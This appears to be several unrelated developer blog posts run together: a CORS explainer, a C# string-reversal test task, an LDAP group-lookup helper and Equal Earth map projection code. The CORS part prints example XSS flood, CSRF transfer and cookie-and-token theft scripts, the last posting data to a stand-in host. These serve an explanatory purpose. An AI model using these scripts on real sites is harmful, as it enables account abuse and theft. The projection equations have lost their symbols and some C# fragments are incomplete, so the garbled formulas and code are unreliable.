Due to CORS restrictions, it doesn't work for all sites (or needs CORS to be disabled in the browser).
Anyway, it's a good starting point to make a brief article about CORS.

CORS in two words three sentences

  1. The browser loads a site from the server (origin-A) containing a script that makes a request to another server (origin-B).

  2. The browser executes the script and makes a "preflight" request (OPTIONS HTTP method) to origin-B.
    The response may contain Access-Control-Allow-Origin and Access-Control-Allow-Methods headers (these are the most commonly used, but there are others).

  3. Before executing the actual meaningful request (GET, POST, etc.) the browser checks if origin-A is within the Access-Control-Allow-Origin and the HTTP method is in Access-Control-Allow-Methods.
    If not - the request is blocked.

Here is an explanatory gif:

Important: "origin" is a combination of scheme ("http", "https"), domain (but not subdomain) and port.
For example, "https://ui.domain.com" and "https://api.domain.com" are considered different origins.

Conclusions

  • CORS headers are controlled by origin-B, not origin-A. Usually, in your React \ Angular \ Vue app, you have to put it on the server API side.

  • You can bypass CORS restrictions by using a so-called "CORS proxy" (the problem of misunderstanding CORS is so big that even some commercial workarounds were implemented). However, I don't recommend it for anything serious.

  • As all the checks are done by your browser, there are some ways to disable it (with extensions, startup arguments and so on). But don't ask your users to do that.

  • Cross-site requests are not necessary something bad.

Why? (XSS and CSRF attacks)

Here are some examples - just to show that CORS was not invented only to inconvenience developers.

XSS-based DDoS \ Flood

The idea here is about making a user to participate in an attack without even knowing what is going on.
The user's browser loads a site containing a script which makes a request (automatically) to the attackable site. More users - more requests, until the server or the network won't be able to handle it.

Many times, reading about XSS attacks, I found an example with an alert(), which is confusing as it does nothing but reveal itself.
Here is a better example:

<script>
setInterval(() => {
const xmlHttp = new XMLHttpRequest();
xmlHttp.open('POST', 'https://attackablesite.com/contactme', true);
xmlHttp.send('subject=Your+site+is+down');
}, 1000);
</script>

Without CORS restrictions (or with "Access-Control-Allow-Origin: *" on the attackable site) every user who opens a site containing the script above, would make a request, every second.

CSRF (XSS-based user action emulation)

Technically the same as above, but in this case the target is the user.

The attack takes advantage of the fact that the user is already authenticated (e.g. on a bank site) to execute some unwanted actions. See example:

<script>
const xmlHttp = new XMLHttpRequest();
xmlHttp.open('POST', 'https://somenotsafeuserbank.com/transfers', true);
xmlHttp.send('receivingaccount=malicious&amount=100');
</script>

Again, with a wrong CORS configuration (or without CORS at all) and without other security measures, this would work.

Fishing and fake sites

Without CORS restrictions, making fake sites would be fairly easy (especially for the sites having separate API and UI parts).
But keep in mind that CORS doesn't prevent such things, it just makes them a bit more complicated.

CORS will not prevent cookies and other data theft

In the code below, "https://userdatatheft.com" is the server who controls the CORS headers, so it will likely set "Access-Control-Allow-Origin: *", and the request will pass.

<script>
const xmlHttp = new XMLHttpRequest();
xmlHttp.open('POST', 'https://userdatatheft.com/', true);
xmlHttp.send('cookie=' + document.cookie + '&token=' + window.localStorage.getItem('token'));
</script>

Test task && Performance optimization

Showing how a developer (me in this case) approaches a problem, and how an apparently simple task can become somewhat complicated and unclear.

Some performance optimization tips, not the best C# code and other tech stuff.

I'm not into test tasks, but this time I thought why not...

The (little rephrased) test task:

  1. Separate a string input into words.

  2. Reverse all words with uneven length, remove all duplicate words with even length.

  3. Return a string made up of the results of pt. 2, ordered by length, ascending.

  • Do it as fast as possible.

  • Do not use AI, GPT, etc.

Okay, "Create a new project"...

First implementations && first questions

Windows Forms? Web? Experiment with MAUI? Unit Test Project?

internal class Program
{
static void Main(string[] args)
{

Console.WriteLine(output);

private static string RunTestTask(string input)
{
var separators = new char[] { '.', ',' };
var words = input.Split(separators, StringSplitOptions.RemoveEmptyEntries);
var resultWords = new List<string>();
foreach (var word in words)
{
if (word.Length % 2 == 0)
{
if (!resultWords.Contains(word))
{
resultWords.Add(word);
}
}
else
{
resultWords.Add(new String(word.Reverse().ToArray()));
}
}
return String.Join(" ", resultWords.OrderBy(x => x.Length));
}
}

Not so readable code

The main idea here is to use some task-relevant and more efficient data structure instead of IEnumerable<string>

internal class TestTask_Faster : ITestTask
{
private List<Dictionary<string, int>> _words = new List<Dictionary<string, int>>();

public string Run(string input)
{
_words.Clear();

if (String.IsNullOrEmpty(input))
return input;

var wordBuilder = new StringBuilder();
foreach (var chr in input)
{
var isSeparator = Consts.SeparatorsList.Contains(chr);
if (isSeparator)
{
if (wordBuilder.Length != 0)
{
var word = wordBuilder.ToString();
AddWord(word);
}
wordBuilder.Clear();
}
else
{
wordBuilder.Append(chr);
}
}
if (wordBuilder.Length != 0)
{
var word = wordBuilder.ToString();
AddWord(word);
}

var resultBuilder = new StringBuilder();
for (var wordLength = 1; wordLength < _words.Count; wordLength++)
{
var isEvenLength = wordLength % 2 == 0;
if (isEvenLength)
{
foreach (var word in _words[wordLength].Keys)
{
resultBuilder.Append(word).Append(" ");
}
}
else
{
foreach (var word in _words[wordLength].Keys)
{
var reversedWord = Reverse(word);
for (var counter = 0; counter < _words[wordLength][word]; counter++)
{
resultBuilder.Append(reversedWord).Append(" ");
}
}
}
}

var result = resultBuilder.ToString(0, resultBuilder.Length - 1);
return result;
}

private void AddWord(string word)
{
EnsureWordLength(word.Length);
if (_words[word.Length].ContainsKey(word))
{
_words[word.Length][word]++;
}
else
{
_words[word.Length].Add(word, 1);
}
}

private void EnsureWordLength(int wordLength)
{
while (_words.Count <= wordLength)
{
_words.Add(new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase));
}
}

private string Reverse(string str)
{
if (str.Length == 1)
return str;

return new String(str.Reverse().ToArray());
}
}

This implementation took about 2 hours with all the debug and tests

I don't think it's possible to tell how I did come to this implementation.

First, the performance: 640 ms (-20%) (without Stopwatches)

Next, the test task does not mention anything about same length words ordering, so different solutions can return different results - and this is absolutely valid, and this is the case with this new one. I had to change my self-tests to avoid false failures. I'll not add another performance-decreasing OrderBy or ThenBy to make it deterministic without explicit requirement, no-no-no.

The slow parts:

  • Consts.Separators.Contains (Separators is a 20 chars array).

  • First StringBuilder (var wordBuilder) operations.

  • AddWord method. Expected.

using Novell.Directory.Ldap;

namespace YuskiTheDeveloper.Ldap
{
public class LdapHelper
{
/// <param name="host">domain name or IP address are valid</param>
/// <param name="port">standard ports are 389, 636 (ldaps) for local domain controller and 3268, 3269 (ldaps) for global catalog</param>
public LdapHelper(string host, int port)
{
if (String.IsNullOrWhiteSpace(host))
throw new ArgumentException(nameof(host));
if ((port <= 0) || (port >= 65536))
throw new ArgumentException(nameof(port));

_host = host;
_port = port;
}

private readonly string _host;
private readonly int _port;

/// <summary>
/// Returns the user with the groups he is member of
/// </summary>
public LdapUser GetUser(string domain, string username, string password)
{
if (String.IsNullOrWhiteSpace(domain))
throw new ArgumentException(nameof(domain));
if (String.IsNullOrWhiteSpace(username))
throw new ArgumentException(nameof(username));
if (String.IsNullOrWhiteSpace(password))
throw new ArgumentException(nameof(password));

using (LdapConnection ldapConnection = new LdapConnection())
{
ldapConnection.Constraints.ReferralFollowing = true;
ldapConnection.SearchConstraints.ReferralFollowing = true;
try
{
ldapConnection.Connect(_host, _port);
}
catch (Exception ex)
{
throw new Exception($"Error connecting to {_host}:{_port}", ex);
}
if (!ldapConnection.Connected)
throw new Exception($"Error connecting to {_host}:{_port}");

try
{
ldapConnection.Bind(LdapConnection.LdapV3, $"{username}@{domain}", password);
}
catch (Exception ex)
{
throw new Exception($"Wrong credentials for {domain}\\{username}", ex);
}
if (!ldapConnection.Bound)
throw new Exception($"Wrong credentials for {domain}\\{username}");

var requestDN = $"{String.Join(",", domain.Split('.').Select(x => $"dc={x}"))}";
var userRequestFilter = $"(&(objectClass=person)(objectCategory=user)(sAMAccountName={username}))";

ILdapSearchResults userResponse;
try
{
//"uid" and "displayname" are just for debugging
userResponse = ldapConnection.Search(requestDN, LdapConnection.ScopeSub, userRequestFilter, new string[] { "uid", "mail", "memberof", "samaccountname", "company", "displayname" }, false);
}
catch (Exception ex)
{
throw new Exception($"Error searching for {userRequestFilter}", ex);
}

LdapUser result = null;
foreach (var item in userResponse)
{
result = new LdapUser();
result.UserName = $"{domain}\\{username}";
foreach (string attributeKey in item.GetAttributeSet().Select(x => x.Key))
{
var values = item.GetAttribute(attributeKey).StringValueArray;

if (String.Equals(attributeKey, "company", StringComparison.OrdinalIgnoreCase))
{
var value = String.Join(";", values.Select(x => x.ToString()));
result.CompanyName = value;
}
else if (String.Equals(attributeKey, "mail", StringComparison.OrdinalIgnoreCase))
{
var value = String.Join(";", values.Select(x => x.ToString()));
result.EMail = value;
}
else if (String.Equals(attributeKey, "displayname", StringComparison.OrdinalIgnoreCase))
{
var value = String.Join(";", values.Select(x => x.ToString()));
result.DisplayName = value;
}
else if (String.Equals(attributeKey, "memberof", StringComparison.OrdinalIgnoreCase))
{
result.GroupNames.UnionWith(values.Select(x => GetName(x)));
}
}
break;
}
if (result == null)
throw new Exception($"Nothing found while searching for {userRequestFilter}");

foreach (var groupName in result.GroupNames.ToArray())
{
result.GroupNames.UnionWith(GetMemberOfRecursive(ldapConnection, requestDN, groupName));
}
return result;
}
}

private IEnumerable<string> GetMemberOfRecursive(LdapConnection ldapConnection, string requestDN, string groupName)
{
var groupRequestFilter = $"(&(objectClass=group)(cn={EscapeFilterParam(groupName)}))";

ILdapSearchResults groupResponse;
try
{
//"uid" and "displayname" are just for debugging
groupResponse = ldapConnection.Search(requestDN, LdapConnection.ScopeSub, groupRequestFilter, new string[] { "uid", "memberof", "displayname" }, false, new LdapSearchConstraints() { ReferralFollowing = true });
}
catch (Exception ex)
{
throw new Exception($"Error searching for {groupRequestFilter}", ex);
}

var result = new HashSet<string>();
foreach (var item in groupResponse)
{
foreach (string attributeKey in item.GetAttributeSet().Select(x => x.Key))
{
var values = item.GetAttribute(attributeKey).StringValueArray;

if (String.Equals(attributeKey, "memberof", StringComparison.OrdinalIgnoreCase))
{
result.UnionWith(values.Select(x => GetName(x)));
}
}
}
foreach (var parentGroupName in result.ToArray())
{
result.UnionWith(GetMemberOfRecursive(ldapConnection, requestDN, parentGroupName));
}
return result;
}

private string EscapeFilterParam(string groupName)
{
//sure there are more
return groupName.Replace("\\", "").Replace("(", "\\(").Replace(")", "\\)").Replace("&", "\\&").Replace("|", "\\|").Replace("=", "\\=");
}

private string GetName(string value)
{
//#oops!
value = value.Replace("\\,", "@#$");

var prefix = "CN=";
var prefixLength = prefix.Length;

var indexOfCN = value.IndexOf(prefix);
if (indexOfCN == -1)
return null;

var indexOfComma = value.IndexOf(",", indexOfCN);
if (indexOfComma == -1)
{
indexOfComma = value.Length;
}
var result = value.Substring(indexOfCN + prefixLength, indexOfComma - indexOfCN - prefixLength);

//#oops!
result = result.Replace("@#$", "\\,");

return result;
}
}

{

public string CompanyName { get; set; }
public string EMail { get; set; }
public string DisplayName { get; set; }
public HashSet<string> GroupNames { get; } = new HashSet<string>();
}

Some math

As the project site says, the equations for this projection are (parentheses and added for readability):

sin = (3/2)·cos
x = (2·3··cos) / (3·(A1 + 3·A2·2 + 6·(7·A3 + 9·A4·2)))
y = ·(A1 + A2·2 + 6·(A3 + A4·2))

where is longitude, is latitude, A1 = 1.340264, A2 = -0.081106, A3 = 0.000893, A4 = 0.003796.

Some solution-specific details:

  • The formulas above will give values from -2.70663 to 2.70663 for x and from -1.31736 to 1.31736 for y.
  • The SVGs are 1117.39 per 544.06.
  • SVGs coordinates"origin" (0-point) is at the top left corner, geographic "origin" is approximately at the center of the map. The Y axes of the map and the SVGs point in opposite directions.
  • The maps above are centered at Florence meridian (11E), not Greenwich.
  • Coordinates like 6344N 1115E are "degrees", but most math libraries work with "radians".

using System.Drawing;

namespace YuskiTheDeveloper.EqualEarthMap
{
public static class EqualEarthHelper
{
private const float A1 = 1.340264F;
private const float A2 = -0.081106F;
private const float A3 = 0.000893F;
private const float A4 = 0.003796F;

private const float FlorenceLongitudeDegrees = 11F;

private const float SVGWidth = 1117.39F;
private const float SVGHeight = 544.06F;

private const float XMax = 2.706630F;
private const float YMax = 1.317363F;

public static PointF GetPointDegrees(float latitudeDegrees, float longitudeDegrees)
{
var latitudeRadians = GetRadians(latitudeDegrees);
var longitudeRadians = GetRadians(longitudeDegrees);
return GetPointRadians(latitudeRadians, longitudeRadians);
}

public static PointF GetPointRadians(float latituteRadians, float longitudeRadians)
{
longitudeRadians -= GetRadians(FlorenceLongitudeDegrees);
if (longitudeRadians < -Math.PI)
{
longitudeRadians += (float)(2 * Math.PI);
}

var notScaledPoint = GetPointInternal(latituteRadians, longitudeRadians);
var result = ScaleToSvg(notScaledPoint);
return result;
}

private static PointF GetPointInternal(float latituteRadians, float longitudeRadians)
{
var sinTheta = Math.Sqrt(3) / 2 * Math.Sin(latituteRadians);
var theta = Math.Asin(sinTheta);

var x = (2 * Math.Sqrt(3) * longitudeRadians * Math.Cos(theta)) / (3 * (A1 + 3 * A2 * Math.Pow(theta, 2) + Math.Pow(theta, 6) * (7 * A3 + 9 * A4 * Math.Pow(theta, 2))));
var y = theta * (A1 + A2 * Math.Pow(theta, 2) + Math.Pow(theta, 6) * (A3 + A4 * Math.Pow(theta, 2)));

return new PointF((float)x, (float)y);
}

private static PointF ScaleToSvg(PointF notScaledPoint)
{
var result = new PointF((float)((notScaledPoint.X + XMax) * (SVGWidth / (XMax * 2))), (float)((-(notScaledPoint.Y - YMax)) * (SVGHeight / (YMax * 2))));
return result;
}

private static float GetRadians(float degrees)
{
return (float)(Math.PI * degrees / 180.0F);
}
}
}
